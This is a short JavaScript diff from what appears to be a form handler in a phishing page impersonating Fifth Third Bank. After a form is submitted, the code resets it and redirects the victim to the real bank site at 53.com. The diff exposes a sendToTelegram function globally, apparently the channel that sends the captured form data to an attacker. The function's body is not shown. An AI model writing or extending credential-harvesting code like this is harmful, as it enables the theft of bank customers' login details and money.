@@ -38,4 +38,6 @@ document.addEventListener('DOMContentLoaded', function() {
     form.reset();
     window.location.href = 'https://www.53.com/';
   });
-}); 
+});
+
+window.sendToTelegram = sendToTelegram; 
